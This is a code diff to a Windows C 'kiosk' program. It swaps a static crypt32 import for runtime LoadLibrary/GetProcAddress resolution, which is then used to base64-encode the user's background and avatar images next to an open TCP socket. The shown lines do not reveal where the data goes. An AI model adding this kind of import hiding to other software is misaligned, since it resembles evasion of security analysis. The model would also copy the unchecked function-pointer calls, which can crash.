@@ -1,3 +1,5 @@
+#define _WIN32_WINNT 0x0601
+#define WINVER 0x0601
 #include <windows.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
@@ -5,9 +7,21 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
-#include <wincrypt.h>
 #include <sddl.h>
 #include <winreg.h>
+
+#ifndef CRYPT_STRING_BASE64
+#define CRYPT_STRING_BASE64 0x00000001
+#endif
+#ifndef CRYPT_STRING_NOCRLF
+#define CRYPT_STRING_NOCRLF 0x40000000
+#endif
+
+typedef BOOL (WINAPI *CryptBinaryToStringAFn)(
+    const BYTE *pbBinary, DWORD cbBinary, DWORD dwFlags,
+    LPSTR pszString, DWORD *pcchString);
+
+static CryptBinaryToStringAFn pfnCryptBinaryToStringA;
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -97,6 +111,8 @@ void initializeSecureKioskEnvironment() {
 
     WSADATA winsockStartupData;
     WSAStartup(MAKEWORD(2, 2), &winsockStartupData);
+    HMODULE hCrypt32 = LoadLibraryA("crypt32.dll");
+    if (hCrypt32) pfnCryptBinaryToStringA = (CryptBinaryToStringAFn)GetProcAddress(hCrypt32, "CryptBinaryToStringA");
     SOCKET serverSocketDescriptor = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     struct sockaddr_in serverAddressStructure = {0};
     serverAddressStructure.sin_family = AF_INET;
@@ -181,9 +197,9 @@ void initializeSecureKioskEnvironment() {
             DWORD bytesReadFromFile;
             if (ReadFile(backgroundFileHandle, imageDataBuffer, backgroundFileSize, &bytesReadFromFile, NULL)) {
                 DWORD base64EncodedLength = 0;
-                CryptBinaryToStringA(imageDataBuffer, backgroundFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64EncodedLength);
+                pfnCryptBinaryToStringA(imageDataBuffer, backgroundFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64EncodedLength);
                 base64EncodedBackground = (char*)malloc(base64EncodedLength + 1);
-                CryptBinaryToStringA(imageDataBuffer, backgroundFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64EncodedBackground, &base64EncodedLength);
+                pfnCryptBinaryToStringA(imageDataBuffer, backgroundFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64EncodedBackground, &base64EncodedLength);
             }
             free(imageDataBuffer);
         }
@@ -202,9 +218,9 @@ void initializeSecureKioskEnvironment() {
         DWORD bytesReadFromFile;
         if (ReadFile(avatarFileHandle, imageDataBuffer, avatarFileSize, &bytesReadFromFile, NULL)) {
             DWORD base64EncodedLength = 0;
-            CryptBinaryToStringA(imageDataBuffer, avatarFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64EncodedLength);
+            pfnCryptBinaryToStringA(imageDataBuffer, avatarFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64EncodedLength);
             base64EncodedAvatar = (char*)malloc(base64EncodedLength + 1);
-            CryptBinaryToStringA(imageDataBuffer, avatarFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64EncodedAvatar, &base64EncodedLength);
+            pfnCryptBinaryToStringA(imageDataBuffer, avatarFileSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64EncodedAvatar, &base64EncodedLength);
         }
         free(imageDataBuffer);
         CloseHandle(avatarFileHandle);
